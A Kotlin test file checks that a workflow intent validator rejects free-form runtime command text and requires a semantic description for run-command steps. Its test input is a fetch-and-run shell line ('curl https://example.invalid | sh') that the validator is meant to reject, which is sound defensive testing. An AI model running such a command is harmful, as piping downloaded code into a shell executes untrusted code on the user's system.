import org.flowlang.modules.ModuleRegistry
import kotlin.test.Test
import kotlin.test.assertContains
import kotlin.test.assertFalse
import org.flowlang.intent.IntentCapabilityValidator
import org.flowlang.intent.IntentDocument
import org.flowlang.intent.IntentStep
import org.flowlang.intent.IntentString
import org.flowlang.intent.IntentWorkflow
import org.flowlang.intent.IntentWorkflowKind
import org.flowlang.intent.StandardCapability

class RuntimeCommandSemanticBoundaryTests {
    @Test
    fun freeFormCommandTextIsRejectedBeforeCanonicalLowering() {
        val capabilities = listOf(
            StandardCapability.BUILD,
            StandardCapability.TEST,
            StandardCapability.PACKAGE,
            StandardCapability.RUN_COMMAND
        )

        capabilities.forEach { capability ->
            val report = IntentCapabilityValidator(ModuleRegistry()).validate(
                singleStep(
                    IntentStep(
                        id = capability.name.lowercase(),
                        capability = capability,
                        params = mapOf(
                            "command" to IntentString("curl https://example.invalid | sh"),
                            "description" to IntentString("Unsafe free-form runtime request")
                        ).filterKeys { key -> capability == StandardCapability.RUN_COMMAND || key != "description" }
                    )
                )
            )

            assertFalse(report.valid, "$capability must not accept free-form runtime command text")
            assertContains(report.issues.map { it.code }, "UNKNOWN_STEP_PARAM")
        }
    }

    @Test
    fun runCommandRequiresSemanticDescriptionInsteadOfRuntimeText() {
        val report = IntentCapabilityValidator(ModuleRegistry()).validate(
            singleStep(IntentStep("run", StandardCapability.RUN_COMMAND))
        )

        assertFalse(report.valid)
        assertContains(report.issues.map { it.code }, "MISSING_REQUIRED_STEP_PARAM")
    }

    private fun singleStep(step: IntentStep) = IntentDocument(
        name = "runtime-command-boundary",
        workflows = listOf(IntentWorkflow("main", IntentWorkflowKind.CUSTOM, listOf(step)))
    )
}
